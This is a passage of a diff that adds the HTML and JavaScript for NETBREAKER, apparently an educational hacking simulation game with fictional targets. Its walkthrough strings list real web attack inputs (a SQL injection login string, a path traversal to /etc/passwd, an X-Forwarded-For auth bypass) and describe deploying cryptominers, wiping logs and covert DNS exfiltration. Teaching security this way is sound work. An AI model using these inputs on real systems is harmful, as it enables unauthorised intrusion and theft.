@@ -1,0 +1,2654 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no,viewport-fit=cover">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black">
+<title>NETBREAKER</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=VT323&display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;}
+html,body{height:100%;overflow:hidden;background:var(--bg);color:var(--g);font-family:'Share Tech Mono',monospace;font-size:13px;}
+:root{--g:#00ff41;--g2:#00cc33;--g3:#008822;--gdim:#001a00;--bg:#000;--bg2:#020a02;--border:#0a2a0a;--border2:#0f3f0f;--red:#ff2244;--yellow:#ffdd00;--cyan:#00ffff;--orange:#ff8800;--blue:#4488ff;--purple:#cc44ff;--amber:#ffb000;--textd:#2a5a2a;--textdd:#143014;}
+body.light{
+  background:#f0f4f0;color:#1a2a1a;
+  --danger-bg:#f0d0d4;
+  --g:#1a6b1a;--g2:#155515;--g3:#0f3f0f;--gdim:#d4ead4;
+  --bg:#f0f4f0;--bg2:#e0ece0;--border:#a0c4a0;--border2:#80aa80;
+  --red:#b30020;--yellow:#7a5c00;--cyan:#005577;--orange:#7a3300;
+  --blue:#003388;--purple:#550077;--amber:#7a4400;
+  --textd:#336633;--textdd:#559955;
+}
+body.light #term-output{color:#1a2a1a;}
+body.light .tl{color:#1a2a1a;}
+body.light .tl.pre{color:#2a3a2a;}
+body.light .tl.dim{color:#336633;}
+body.light .tl.ok{color:#0a4a0a;}
+body.light .ssec p,.body.light .ssec li{color:#2a3a2a;}
+body.light #modal-body{color:#2a3a2a;}
+body.light .cve-detail{color:#2a3a2a;}
+body.light .stbl td{color:#2a3a2a;}
+body.light .nc-desc,.body.light .nc-ip{color:#336633;}
+body.light .salert.ok{background:#d0ead0;border-color:#80aa80;color:#0a4a0a;}
+body.light .salert.err{background:#f0d0d4;border-color:#b30020;color:#b30020;}
+body.light .salert.warn{background:#f0e8d0;border-color:#7a3300;color:#7a3300;}
+body.light .vi-sqli{background:#f0e8d0;color:#7a3300;}
+body.light .vi-xss{background:#ead0f0;color:#550077;}
+body.light .vi-idor{background:#d0e8f0;color:#005577;}
+body.light .vi-lfi{background:#f0f0d0;color:#7a5c00;}
+body.light .vi-auth{background:#f0d0e8;color:#880044;}
+body.light .cve-score.critical{background:#f0d0d4;color:#b30020;}
+body.light .cve-score.high{background:#f0e8d0;color:#7a3300;}
+body.light .cve-score.med{background:#f0f0d0;color:#7a5c00;}
+body.light .tag-easy{color:#0a4a0a;border-color:#0a4a0a44;}
+body.light .tag-med{color:#7a5c00;border-color:#7a5c0044;}
+body.light .tag-hard{color:#7a3300;border-color:#7a330044;}
+body.light .tag-elite{color:#b30020;border-color:#b3002044;}
+body.light .fsi.dir{color:#005577;}
+body.light .fsi.keyf{color:#7a5c00;}
+body.light #tb-logo{text-shadow:none;}
+body.light #title-art{text-shadow:none;}
+
+.screen{display:none;position:fixed;inset:0;z-index:10;overflow:hidden;flex-direction:column;}
+.screen.active{display:flex;}
+#s-title{background:var(--bg);align-items:center;justify-content:center;overflow-y:auto;}
+#title-art{font-size:9px;color:var(--g);text-shadow:0 0 10px #00ff4166;white-space:pre;text-align:center;line-height:1.2;margin-bottom:8px;}
+#title-sub{font-size:10px;color:var(--textd);letter-spacing:3px;margin-bottom:4px;text-align:center;}
+#title-ver{font-size:9px;color:var(--textdd);margin-bottom:20px;letter-spacing:2px;text-align:center;}
+.char-grid{display:flex;gap:8px;flex-wrap:wrap;justify-content:center;margin-bottom:14px;max-width:480px;padding:0 10px;}
+.char-slot{width:138px;background:var(--bg2);border:1px solid var(--border2);padding:12px;cursor:pointer;text-align:center;font-family:'Share Tech Mono',monospace;}
+.char-slot:active{border-color:var(--g);}
+.slot-avatar{font-size:24px;margin-bottom:5px;}
+.slot-handle{font-size:13px;color:var(--g);margin-bottom:3px;}
+.slot-info{font-size:9px;color:var(--textd);line-height:1.6;}
+.slot-del{font-size:9px;color:var(--red);margin-top:5px;display:block;cursor:pointer;}
+#new-char-panel{background:var(--bg2);border:1px solid var(--border2);padding:16px;text-align:center;width:260px;display:none;margin-bottom:8px;}
+.nc-label{color:var(--g);font-size:11px;letter-spacing:3px;margin-bottom:10px;}
+#nc-handle{width:100%;background:var(--bg);border:1px solid var(--border2);color:var(--g);font-family:'Share Tech Mono',monospace;font-size:14px;padding:7px;margin-bottom:9px;outline:none;text-align:center;letter-spacing:2px;}
+#nc-handle:focus{border-color:var(--g);}
+.t-btn{display:inline-block;padding:7px 16px;background:var(--gdim);border:1px solid var(--g2);color:var(--g);font-family:'Share Tech Mono',monospace;font-size:11px;cursor:pointer;letter-spacing:2px;margin:3px;user-select:none;}
+.t-btn:active{background:#004a10;}
+.t-btn.danger{border-color:var(--red);color:var(--red);background:var(--danger-bg,#1a0008);}
+.t-btn.sm{font-size:9px;padding:4px 9px;}
+#title-disclaimer{margin-top:14px;font-size:9px;color:var(--textdd);text-align:center;max-width:400px;line-height:1.7;border-top:1px solid var(--border);padding:10px 10px 20px;}
+#s-game{flex-direction:column;background:var(--bg);}
+#topbar{display:flex;justify-content:space-between;align-items:center;padding:4px 8px;border-bottom:1px solid var(--border2);background:var(--bg);flex-shrink:0;min-height:34px;gap:4px;}
+#tb-logo{font-family:'VT323',monospace;font-size:20px;color:var(--g);text-shadow:0 0 8px #00ff4188;flex-shrink:0;}
+#tb-mid{display:flex;align-items:center;gap:8px;flex:1;justify-content:center;overflow:hidden;}
+.tb-stat{font-size:9px;color:var(--textd);white-space:nowrap;}
+.tb-val{color:var(--g);font-size:11px;}
+.tb-val.y{color:var(--yellow);}
+#wanted-row{display:flex;gap:1px;}
+.ws{font-size:12px;color:var(--textdd);}
+.ws.on{color:var(--yellow);}
+.ws.w3.on{color:var(--orange);}
+.ws.w4.on,.ws.w5.on{color:var(--red);}
+#tb-right{display:flex;align-items:center;gap:3px;flex-shrink:0;}
+#tabbar{display:flex;border-bottom:1px solid var(--border2);background:var(--bg);flex-shrink:0;overflow-x:auto;scrollbar-width:none;}
+#tabbar::-webkit-scrollbar{display:none;}
+.tab{flex:1;min-width:62px;padding:7px 3px 5px;text-align:center;font-size:9px;letter-spacing:.5px;color:var(--textd);border-bottom:2px solid transparent;cursor:pointer;user-select:none;white-space:nowrap;}
+.tab .ti{font-size:13px;display:block;margin-bottom:1px;}
+.tab.on{color:var(--g);border-bottom-color:var(--g);}
+#pane-container{flex:1;overflow:hidden;position:relative;min-height:0;}
+.pane{display:none;flex-direction:column;height:100%;background:var(--bg);}
+.pane.on{display:flex;}
+.pane-hdr{display:flex;align-items:center;justify-content:space-between;padding:4px 8px;border-bottom:1px solid var(--border);background:var(--bg);flex-shrink:0;}
+.pane-title{font-size:9px;letter-spacing:2px;color:var(--textd);}
+.pane-meta{font-size:9px;color:var(--textdd);}
+#term-output{flex:1;overflow-y:auto;overflow-x:hidden;padding:5px 8px 3px;font-family:'Share Tech Mono',monospace;font-size:12px;line-height:1.55;color:var(--textd);}
+#term-output::-webkit-scrollbar{width:3px;}
+#term-output::-webkit-scrollbar-thumb{background:var(--border2);}
+.tl{display:block;word-break:break-word;}
+.tl.cmd{color:var(--g);}
+.tl.err{color:var(--red);}
+.tl.sys{color:var(--cyan);}
+.tl.warn{color:var(--orange);}
+.tl.ok{color:#00ff88;}
+.tl.dim{color:var(--textd);}
+.tl.pre{white-space:pre-wrap;font-size:11px;}
+.tl.hdr{color:var(--g);font-size:11px;border-bottom:1px solid var(--border2);margin-bottom:2px;margin-top:4px;}
+.tl.hint{color:var(--purple);font-size:11px;}
+#term-input-wrap{display:flex;align-items:center;padding:5px 8px;border-top:1px solid var(--border2);background:var(--bg);flex-shrink:0;}
+#term-prompt{color:var(--g);margin-right:4px;font-size:12px;white-space:nowrap;flex-shrink:0;}
+#term-input{flex:1;background:transparent;border:none;color:var(--g);font-family:'Share Tech Mono',monospace;font-size:12px;outline:none;caret-color:var(--g);-webkit-appearance:none;}
+#browser-toolbar{display:flex;align-items:center;gap:4px;padding:5px 7px;border-bottom:1px solid var(--border);background:var(--bg);flex-shrink:0;flex-wrap:wrap;}
+#browser-url{flex:1;min-width:100px;background:var(--bg2);border:1px solid var(--border2);color:var(--cyan);font-family:'Share Tech Mono',monospace;font-size:10px;padding:4px 6px;outline:none;}
+#browser-url:focus{border-color:var(--cyan);}
+.br-btn{padding:4px 7px;background:var(--gdim);border:1px solid var(--border2);color:var(--g);font-family:'Share Tech Mono',monospace;font-size:9px;cursor:pointer;white-space:nowrap;}
+.br-btn:active{background:#003a10;}
+.br-btn.atool{border-color:var(--cyan);color:var(--cyan);}
+#icpt-panel{display:none;background:var(--bg);border:1px solid var(--border2);margin:5px 7px;padding:8px;}
+#icpt-panel.active{display:block;}
+.icpt-hdr{font-size:10px;color:var(--orange);margin-bottom:5px;}
+.icpt-req{background:var(--bg2);border:1px solid var(--border);font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--g);padding:6px;white-space:pre;overflow-x:auto;max-height:90px;overflow-y:auto;margin-bottom:5px;}
+.icpt-edit{width:100%;background:var(--bg);border:1px solid var(--border2);color:var(--g);font-family:'Share Tech Mono',monospace;font-size:10px;padding:5px;height:65px;outline:none;resize:vertical;}
+#browser-body{flex:1;overflow-y:auto;padding:10px;font-size:11px;line-height:1.7;color:var(--textd);}
+#browser-body::-webkit-scrollbar{width:3px;}
+#browser-body::-webkit-scrollbar-thumb{background:var(--border2);}
+.site-wrap{max-width:580px;margin:0 auto;}
+.site-nav{display:flex;flex-wrap:wrap;border-bottom:1px solid var(--border2);margin-bottom:10px;}
+.snav{padding:5px 10px;font-size:10px;cursor:pointer;color:var(--textd);border-bottom:2px solid transparent;}
+.snav.on{color:var(--cyan);border-bottom-color:var(--cyan);}
+.site-hdr{padding:10px 0 8px;border-bottom:1px solid var(--border2);margin-bottom:10px;}
+.site-name{font-size:18px;color:var(--cyan);font-family:'VT323',monospace;}
+.site-domain{font-size:9px;color:var(--textd);margin-top:1px;}
+.ssec{margin-bottom:12px;}
+.ssec h3{font-size:11px;color:var(--g);margin-bottom:5px;letter-spacing:1px;}
+.ssec p,.ssec li{font-size:10px;color:var(--textd);line-height:1.8;}
+.ssec ul{padding-left:12px;}
+.ssec .meta{font-size:9px;color:var(--textd);margin-top:3px;}
+.sform{background:var(--bg2);border:1px solid var(--border);padding:10px;margin-top:6px;}
+.sform input,.sform textarea{width:100%;background:var(--bg);border:1px solid var(--border2);color:var(--g);font-family:'Share Tech Mono',monospace;font-size:11px;padding:5px;margin:3px 0;outline:none;}
+.sform input:focus,.sform textarea:focus{border-color:var(--g2);}
+.sform label{font-size:9px;color:var(--textd);display:block;margin-top:5px;}
+.fbtn{padding:6px 12px;background:var(--gdim);border:1px solid var(--g2);color:var(--g);font-family:'Share Tech Mono',monospace;font-size:10px;cursor:pointer;margin-top:5px;}
+.fbtn:active{background:#004a10;}
+.salert{padding:5px 9px;font-size:10px;margin:5px 0;}
+.salert.ok{background:#001a00;border:1px solid #00aa22;color:#00ff88;}
+.salert.err{background:#1a0004;border:1px solid var(--red);color:var(--red);}
+.salert.warn{background:#1a0d00;border:1px solid var(--orange);color:var(--orange);}
+.stbl{width:100%;border-collapse:collapse;font-size:10px;margin-top:5px;}
+.stbl th{color:var(--g);border-bottom:1px solid var(--border2);padding:3px 7px;text-align:left;font-size:9px;}
+.stbl td{color:var(--textd);padding:3px 7px;border-bottom:1px solid var(--border);}
+.slink{color:var(--cyan);cursor:pointer;text-decoration:underline;}
+.vi{display:inline-block;font-size:8px;padding:1px 4px;border-radius:6px;margin-left:3px;}
+.vi-sqli{background:#1a0800;border:1px solid var(--orange);color:var(--orange);}
+.vi-xss{background:#1a0020;border:1px solid var(--purple);color:var(--purple);}
+.vi-idor{background:#001a1a;border:1px solid var(--cyan);color:var(--cyan);}
+.vi-lfi{background:#1a1a00;border:1px solid var(--yellow);color:var(--yellow);}
+.vi-csrf{background:#0a001a;border:1px solid var(--blue);color:var(--blue);}
+.vi-auth{background:#1a0010;border:1px solid #ff44aa;color:#ff44aa;}
+#fs-path-bar{padding:4px 8px;border-bottom:1px solid var(--border);font-size:9px;color:var(--textd);background:var(--bg);flex-shrink:0;}
+#fs-body{flex:1;overflow-y:auto;padding:3px;}
+#fs-body::-webkit-scrollbar{width:3px;}
+#fs-body::-webkit-scrollbar-thumb{background:var(--border2);}
+.fsi{display:flex;align-items:center;gap:5px;padding:4px 6px;cursor:pointer;font-size:11px;border-bottom:1px solid var(--border);}
+.fsi:active{background:var(--gdim);}
+.fsi.dir{color:var(--cyan);}
+.fsi.fil{color:var(--textd);}
+.fsi.exe{color:var(--g);}
+.fsi.keyf{color:var(--yellow);}
+.fsi.lck{color:var(--textd);cursor:not-allowed;}
+#fs-prev{background:var(--bg2);border-top:1px solid var(--border2);padding:7px;font-size:10px;color:#88bb88;white-space:pre-wrap;line-height:1.6;max-height:110px;overflow-y:auto;flex-shrink:0;display:none;font-family:'Share Tech Mono',monospace;}
+#net-body{flex:1;overflow:hidden;position:relative;min-height:0;}
+#net-svg{position:absolute;top:0;left:0;display:block;}
+#net-tooltip{position:absolute;background:var(--bg2);border:1px solid var(--border2);padding:6px 10px;font-size:9px;color:var(--g);pointer-events:none;display:none;max-width:200px;line-height:1.6;z-index:10;}
+#cve-search-bar{display:flex;gap:5px;padding:5px 7px;border-bottom:1px solid var(--border);background:var(--bg);flex-shrink:0;}
+#cve-search{flex:1;background:var(--bg2);border:1px solid var(--border2);color:var(--g);font-family:'Share Tech Mono',monospace;font-size:11px;padding:4px 7px;outline:none;}
+#cve-search:focus{border-color:var(--g2);}
+#cve-body{flex:1;overflow-y:auto;padding:7px;background:var(--bg);}
+#cve-body::-webkit-scrollbar{width:3px;}
+#cve-body::-webkit-scrollbar-thumb{background:var(--border2);}
+.cve-card{background:var(--bg2);border:1px solid var(--border);padding:9px;margin-bottom:7px;cursor:pointer;}
+.cve-card:active{background:var(--gdim);}
+.cve-id{font-size:13px;color:var(--yellow);margin-bottom:2px;font-family:'VT323',monospace;}
+.cve-name{font-size:10px;color:var(--g);margin-bottom:2px;}
+.cve-new-badge{font-size:8px;color:var(--g);border:1px solid var(--g);padding:1px 4px;border-radius:4px;margin-left:5px;vertical-align:middle;}
+.cve-score{display:inline-block;font-size:9px;padding:1px 5px;border-radius:6px;margin-bottom:4px;}
+.cve-score.critical{background:#1a0008;border:1px solid var(--red);color:var(--red);}
+.cve-score.high{background:#1a0800;border:1px solid var(--orange);color:var(--orange);}
+.cve-score.med{background:#1a1000;border:1px solid var(--yellow);color:var(--yellow);}
+.cve-desc{font-size:9px;color:var(--textd);line-height:1.6;}
+.cve-detail{display:none;margin-top:7px;font-size:10px;color:var(--textd);line-height:1.7;border-top:1px solid var(--border);padding-top:7px;}
+.cve-detail.open{display:block;}
+#modal-bg{display:none;position:fixed;inset:0;background:#000000cc;z-index:200;align-items:center;justify-content:center;}
+#modal-bg.on{display:flex;}
+#modal-box{background:var(--bg);border:1px solid var(--border2);width:min(96vw,520px);max-height:82vh;display:flex;flex-direction:column;}
+#modal-hdr{padding:9px 12px;border-bottom:1px solid var(--border);display:flex;justify-content:space-between;align-items:center;flex-shrink:0;}
+#modal-title{font-size:13px;color:var(--g);}
+#modal-x{cursor:pointer;color:var(--textd);font-size:20px;padding:0 4px;line-height:1;}
+#modal-x:active{color:var(--red);}
+#modal-body{padding:11px 12px;overflow-y:auto;flex:1;font-size:11px;line-height:1.7;color:var(--textd);}
+#modal-body::-webkit-scrollbar{width:3px;}
+#modal-body::-webkit-scrollbar-thumb{background:var(--border2);}
+.toast{position:fixed;bottom:10px;left:50%;transform:translateX(-50%);background:var(--bg2);border:1px solid var(--g);padding:6px 14px;font-size:11px;color:var(--g);z-index:300;white-space:nowrap;animation:toastA 3s ease forwards;pointer-events:none;}
+.toast.w{border-color:var(--orange);color:var(--orange);}
+.toast.e{border-color:var(--red);color:var(--red);}
+@keyframes toastA{0%{opacity:0}10%{opacity:1}80%{opacity:1}100%{opacity:0}}
+#ids-bar{display:none;position:fixed;top:34px;left:0;right:0;background:#1a0004;border-bottom:1px solid var(--red);padding:3px 10px;font-size:10px;color:var(--red);z-index:150;text-align:center;letter-spacing:2px;animation:idsP 1s ease infinite;}
+#ids-bar.on{display:block;}
+@keyframes idsP{0%,100%{opacity:1}50%{opacity:.5}}
+</style>
+<script>
+// Apply saved theme before first paint to prevent flash
+(function(){
+  try{
+    var req=indexedDB.open('netbreaker_db',6);
+    req.onsuccess=function(e){
+      var db=e.target.result;
+      var r=db.transaction('saves','readonly').objectStore('saves').getAll();
+      r.onsuccess=function(){
+        var saves=r.result||[];
+        // Use first save's theme pref, or check localStorage fallback
+        var light=(saves.length&&saves[0].lightTheme)||(localStorage.getItem('nb_theme')==='light');
+        if(light)document.body.classList.add('light');
+      };
+    };
+  }catch(e){}
+  // Immediate localStorage check for zero-delay apply
+  if(localStorage.getItem('nb_theme')==='light')document.body.classList.add('light');
+})();
+</script>
+</head>
+<body>
+<div id="s-title" class="screen active">
+  <div id="title-art"> ███╗   ██╗██████╗ ███████╗██████╗ ██████╗ ██████╗███████╗ █████╗ ██╗  ██╗███████╗██████╗
+ ████╗  ██║██╔════╝╚══██╔══╝██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗██║ ██╔╝██╔════╝██╔══██╗
+ ██╔██╗ ██║█████╗     ██║   ██████╔╝██████╔╝██████╔╝█████╗  ██████╔╝█████╔╝ █████╗  ██████╔╝
+ ██║╚██╗██║██╔══╝     ██║   ██╔══██╗██╔══██╗██╔══██╗██╔══╝  ██╔══██╗██╔═██╗ ██╔══╝  ██╔══██╗
+ ██║ ╚████║███████╗   ██║   ██████╔╝██║  ██║███████╗██║  ██║███████╗██║  ██║██║  ██╗███████╗██║  ██║
+ ╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝</div>
+  <div id="title-sub">// PENETRATION SIMULATION v5.3 //</div>
+  <div id="title-ver">[ ALL TARGETS FICTIONAL — EDUCATIONAL ]</div>
+  <div class="char-grid" id="char-grid"></div>
+  <div id="new-char-panel">
+    <div class="nc-label">[ NEW OPERATIVE ]</div>
+    <input id="nc-handle" placeholder="ENTER CALLSIGN" maxlength="16" autocomplete="off" autocorrect="off" autocapitalize="characters" spellcheck="false">
+    <div style="display:flex;gap:5px;justify-content:center;">
+      <button class="t-btn" id="btn-deploy">DEPLOY</button>
+      <button class="t-btn" id="btn-cancel">CANCEL</button>
+    </div>
+  </div>
+  <div id="title-actions"><button class="t-btn" id="btn-new-op">[ + NEW OPERATIVE ]</button></div>
+  <div style="margin-bottom:8px;">
+    <button class="t-btn sm" id="btn-theme-title" title="Toggle light/dark">&#x263C;</button>
+  </div>
+  <div id="title-disclaimer">All companies, IPs and exploits in NETBREAKER are entirely fictional.<br>Educational simulation based on CompTIA Security+ / PenTest+ methodology.</div>
+</div>
+
+<div id="s-game" class="screen">
+  <div id="ids-bar">⚠ IDS ALERT — INTRUSION DETECTED — TRACE ACTIVE ⚠</div>
+  <div id="topbar">
+    <div id="tb-logo">NB://</div>
+    <div id="tb-mid">
+      <div class="tb-stat">OPT:<span class="tb-val" id="tb-handle">—</span></div>
+      <div class="tb-stat">₿<span class="tb-val y" id="tb-credits">0</span></div>
+      <div class="tb-stat">REP:<span class="tb-val" id="tb-rep">0</span></div>
+      <div class="tb-stat" id="tb-miner-stat" style="display:none">⛏<span class="tb-val" style="color:var(--amber)" id="tb-miner-rate">0</span>/30s</div>
+      <div class="tb-stat" style="display:flex;align-items:center;gap:2px;"><span style="font-size:8px;color:var(--textd)">HEAT:</span><div id="wanted-row"><span class="ws" id="ws1">★</span><span class="ws" id="ws2">★</span><span class="ws w3" id="ws3">★</span><span class="ws w4" id="ws4">★</span><span class="ws w5" id="ws5">★</span></div></div>
+    </div>
+    <div id="tb-right">
+      <button class="t-btn sm" id="btn-theme" title="Toggle light/dark theme">&#x263C;</button>
+      <button class="t-btn sm" id="btn-shop">SHOP</button>
+      <button class="t-btn sm danger" id="btn-quit">QUIT</button>
+    </div>
+  </div>
+  <div id="tabbar">
+    <div class="tab on" data-pane="terminal"><span class="ti" style="font-family:monospace;font-size:11px;font-weight:bold">&gt;_</span>TERMINAL</div>
+    <div class="tab" data-pane="browser"><span class="ti">🌐</span>BROWSER</div>
+    <div class="tab" data-pane="fs"><span class="ti">📁</span>FILES</div>
+    <div class="tab" data-pane="network"><span class="ti">🕸</span>NET</div>
+    <div class="tab" data-pane="cve"><span class="ti">🔍</span>CVE-DB</div>
+  </div>
+  <div id="pane-container">
+    <div class="pane on" id="pane-terminal">
+      <div id="term-output"></div>
+      <div id="term-input-wrap">
+        <span id="term-prompt">guest@nb:~$&nbsp;</span>
+        <input id="term-input" type="text" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" placeholder="type help">
+      </div>
+    </div>
+    <div class="pane" id="pane-browser">
+      <div id="browser-toolbar">
+        <input id="browser-url" placeholder="http://">
+        <button class="br-btn" id="btn-go">GO</button>
+        <button class="br-btn" id="btn-icpt">INTERCEPT</button>
+        <button class="br-btn" id="btn-curl">cURL</button>
+        <button class="br-btn" id="btn-fuzz">FUZZER</button>
+        <button class="br-btn" id="btn-cook">COOKIES</button>
+        <button class="br-btn" id="btn-diff">DIFF</button>
+      </div>
+      <div id="icpt-panel">
+        <div class="icpt-hdr">⚡ INTERCEPT MODE ACTIVE</div>
+        <div id="icpt-req" class="icpt-req">[No request yet]</div>
+        <textarea id="icpt-edit" class="icpt-edit" placeholder="Edit request here..."></textarea>
+        <div style="display:flex;gap:4px;margin-top:4px;">
+          <button class="br-btn" id="btn-fwd">FORWARD</button>
+          <button class="br-btn" id="btn-drop">DROP</button>
+          <button class="br-btn" id="btn-sendmod">SEND MODIFIED</button>
+        </div>
+      </div>
+      <div id="browser-body"><div style="padding:28px;text-align:center;color:var(--textd);">No connection.<br><span style="font-size:9px">Enter a URL or tap a target in the Network tab.</span></div></div>
+    </div>
+    <div class="pane" id="pane-fs">
+      <div id="fs-path-bar">PATH: <span id="fs-path-disp">/home/operative</span> · <span id="fs-ctx" style="color:var(--textd)">local</span></div>
+      <div id="fs-body"></div>
+      <div id="fs-prev"></div>
+    </div>
+    <div class="pane" id="pane-network">
+      <div class="pane-hdr">
+  <span class="pane-title">🕸 NETWORK MAP</span>
+  <div style="display:flex;align-items:center;gap:4px;">
+    <button class="t-btn sm" id="net-zoom-in" title="Zoom in">+</button>
+    <button class="t-btn sm" id="net-zoom-out" title="Zoom out">&minus;</button>
+    <button class="t-btn sm" id="net-zoom-reset" title="Reset view">&#x25A3;</button>
+    <span class="pane-meta" id="net-meta">0 targets</span>
+  </div>
+</div>
+      <div id="net-body">
+        <svg id="net-svg" xmlns="http://www.w3.org/2000/svg"></svg>
+        <div id="net-tooltip"></div>
+      </div>
+    </div>
+    <div class="pane" id="pane-cve">
+      <div class="pane-hdr"><span class="pane-title">🔍 CVE DATABASE</span><span class="pane-meta" id="cve-count">9 entries</span></div>
+      <div id="cve-search-bar"><input id="cve-search" placeholder="Search CVEs, services, severity..."></div>
+      <div id="cve-body"></div>
+    </div>
+  </div>
+</div>
+<div id="modal-bg">
+  <div id="modal-box">
+    <div id="modal-hdr"><span id="modal-title">INFO</span><span id="modal-x">✕</span></div>
+    <div id="modal-body"></div>
+  </div>
+</div>
+<script>
+'use strict';
+
+var DB=null;
+function initDB(cb){var req=indexedDB.open('netbreaker_db',6);req.onupgradeneeded=function(e){var db=e.target.result;if(!db.objectStoreNames.contains('saves'))db.createObjectStore('saves',{keyPath:'handle'});};req.onsuccess=function(e){DB=e.target.result;cb();};req.onerror=function(){cb()};}
+function dbGetAll(cb){if(!DB){cb([]);return;}var r=DB.transaction('saves','readonly').objectStore('saves').getAll();r.onsuccess=function(){cb(r.result||[]);};r.onerror=function(){cb([]);};}
+function dbPut(o,cb){if(!DB){if(cb)cb();return;}var tx=DB.transaction('saves','readwrite');tx.objectStore('saves').put(o);tx.oncomplete=function(){if(cb)cb();};}
+function dbDelete(h,cb){if(!DB){if(cb)cb();return;}var tx=DB.transaction('saves','readwrite');tx.objectStore('saves').delete(h);tx.oncomplete=function(){if(cb)cb();};}
+
+var VFILES = {
+  'walkthrough.txt': 'NETBREAKER OPERATOR WALKTHROUGH\nSPOILER WARNING -- read only if stuck.\nAll companies, IPs, and exploits are FICTIONAL simulations.\n\nQUICK START:\n  1. scan <subnet>           Discover live hosts (+10c/host)\n  2. nmap -sV -sC <ip>      Find services and CVEs (+15c/vuln)\n  3. deploy sniffer <ip>     Capture creds passively (+30c, silent)\n  4. gobuster <ip>           Find hidden web paths (+20c)\n  5. exploit <CVE> <ip>      Gain shell access (+75c)\n  6. privesc linpeas          Escalate to root (+100-150c)\n  7. persist cron             Install persistence\n  8. exfil <file> https       Complete the contract\n  9. deploy miner <ip>        Earn passive income (8-80c/30s)\n\nTOPIC FILES:\n  cat walkthrough-targets.txt   All 7 target walkthroughs\n  cat walkthrough-web.txt       SQLi, XSS, IDOR, LFI, CSRF guide\n  cat walkthrough-opsec.txt     Wanted system, log clearing, evasion\n  cat walkthrough-mining.txt    Mining system and economy guide\n  cat exploits.txt              Quick exploit reference\n  cat tools.txt                 Installed tools and commands',
+  'walkthrough-targets.txt': 'This file has been split into per-target files.\nUse: cat walkthrough-target-1.txt  through  cat walkthrough-target-7.txt\nEach file is unlocked when you discover the target.',
+  'walkthrough-web.txt': 'NETBREAKER -- WEB APP EXPLOITATION GUIDE\n\nSQL INJECTION (SQLi):\n  Terminal: exploit sqli <ip>\n  Browser login: username field -> \' OR \'1\'=\'1\'--\n  INTERCEPT: capture POST, edit username, SEND MODIFIED\n  FUZZER: auto-detects SQLi in all fields\n\nXSS (Cross-Site Scripting):\n  Terminal: exploit xss <ip>\n  Browser search/contact: inject script payload\n  Stored XSS in contact forms affects future visitors\n\nIDOR (Insecure Direct Object Reference):\n  Terminal: exploit idor <ip>\n  Browser: /api/users.php?id=1 then id=2, id=3\n  INTERCEPT: modify id param in captured request\n\nLFI (Local File Inclusion):\n  Terminal: exploit lfi <ip>\n  Browser: ?page=../../../etc/passwd\n  Good targets: /etc/passwd, /var/www/html/config.php\n\nCSRF:\n  Terminal: exploit csrf <ip>\n  INTERCEPT: check POST for missing token\n\nAUTH BYPASS:\n  INTERCEPT: add X-Forwarded-For: 127.0.0.1\n  Try default creds, modify role cookies\n\nBROWSER TOOLS:\n  INTERCEPT  capture + edit + forward/drop/send-modified\n  cURL       custom requests with method, headers, body\n  FUZZER     auto-test all fields for XSS, SQLi, LFI, IDOR\n  COOKIES    inspect and modify session tokens\n  DIFF       before/after comparison to confirm exploit',
+  'walkthrough-opsec.txt': 'NETBREAKER -- OPSEC AND WANTED SYSTEM\n\nWANTED rises from: IDS targets, brute force, HTTP exfil\n  3 stars = IDS alert, active trace\n  5 stars = maximum heat, operations harder\n\nPASSIVE PROTECTION:\n  VPN Chain (1200c)  reduces wanted gain by 60%\n  TOR Router (3500c) prevents ALL wanted gain -- required for elite\n\nACTIVE REDUCTION:\n  clearlogs           local only, -1 wanted (free)\n  clearlogs <ip>      remote log wipe, -2 wanted (needs log-cleaner tool)\n  rotateip            break traces, -2 wanted (needs ip-rotator tool)\n  time                natural decay 0.1 per 30s\n\nEXFIL NOISE:\n  http    noisy, +1 wanted on IDS targets\n  https   low noise, recommended\n  dns     covert, evades DLP (needs exfil-kit)\n\nOPTIMAL FLOW:\n  buy TOR early\n  use sniffer (silent) instead of brute force (noisy)\n  exfil via https or dns\n  clearlogs <ip> after each operation',
+  'walkthrough-mining.txt': 'NETBREAKER -- MINING AND ECONOMY GUIDE\n\nMINING SETUP:\n  1. Get root on any target\n  2. Buy XMR Miner from shop (500c)\n  3. deploy miner <ip>\n  4. Income credited every 30 seconds automatically\n  5. miners -- lists all active rigs and total rate\n\nRATES PER TICK (30s):\n  easy target  =  8c  (PetroFlow)\n  med target   = 18c  (NexGenPharm, Darkpeak)\n  hard target  = 35c  (Arclight, OmniCloud)\n  elite target = 80c  (CivicGrid, Sentinel)\n\nBOOST:\n  Mining Pool (2000c) doubles ALL miner rates\n  7 targets + Mining Pool = 548c per 30s passive\n\nECONOMY PROGRESSION:\n  Start:  scan 192.168.10.0/24 -- free credits from recon\n  Step 1: nmap + sniffer + gobuster -> ~200c -> buy gobuster (100c)\n  Step 2: exploit PetroFlow -> root -> buy metasploit (300c)\n  Step 3: deploy miner on PetroFlow (8c/30s)\n  Step 4: chain NexGenPharm (18c/30s more)\n  Step 5: buy Mining Pool -> all rates doubled\n  Endgame: 7 miners + pool = 548c per 30 seconds',
+};
+
+var CVE_DB = [
+  {id:'CVE-2016-0777',name:'OpenSSH User Enumeration',score:5.8,sev:'med',service:'OpenSSH < 7.6',port:22,desc:'Timing side-channel allows valid username enumeration.',exploit:'exploit CVE-2016-0777 <ip>\\nReturns valid usernames via timing oracle',fix:'Upgrade OpenSSH 7.6+.',phase:'Recon'},
+  {id:'CVE-2017-7679',name:'Apache mod_mime Buffer Overflow RCE',score:9.8,sev:'critical',service:'Apache HTTP 2.2.x',port:80,desc:'Buffer overflow in mod_mime allows unauthenticated RCE.',exploit:'Requires: metasploit\\nexploit CVE-2017-7679 <ip>\\nResult: www-data shell',fix:'Upgrade Apache 2.4.26+. Disable mod_mime.',phase:'Exploitation'},
